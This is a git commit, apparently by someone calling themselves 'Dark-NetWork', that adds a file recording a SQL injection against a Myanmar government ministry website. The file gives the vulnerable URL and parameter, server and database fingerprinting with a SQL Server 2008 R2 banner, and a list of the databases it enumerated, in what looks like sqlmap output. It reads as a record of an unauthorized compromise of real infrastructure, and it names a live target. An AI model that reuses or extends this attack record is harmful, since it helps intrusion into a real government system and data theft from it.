a6de9c4cfed27cc071b2e1329474003449520ba5
Dark-NetWork <70242966+Dark-NetWork@users.noreply.github.com>
2021-07-15 13:41:15 +0300

    Create mining.gov.mm

---
+++ mining.gov.mm
@@ -0,0 +1,29 @@
+.gov Government
+
+.mm  Myanmar (Burma)
+
+Ministry of Natural Resources and Environmental Conservation
+
+http://www.mining.gov.mm/ME-1/1.ME-1/Details.asp?submenuID=11&sid=753
+
+the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 2016 or 2019 or 10
+web application technology: Microsoft IIS 10.0, ASP, ASP.NET
+back-end DBMS operating system: Windows 2012 or 8
+back-end DBMS: Microsoft SQL Server 2008
+
+banner:
+---
+Microsoft SQL Server 2008 R2 (RTM) - 10.50.1600.1 (X64) 
+	Apr  2 2010 15:48:46 
+	Copyright (c) Microsoft Corporation
+	Enterprise Edition (64-bit) on Windows NT 6.2 <X64> (Build 9200: )
+---
+    
+available databases [6]:
+[+] MINING_CMS
+[+] model
+[+] msdb
+[+] ReportServer
+[+] ReportServerTempDB
+[+] tempdb
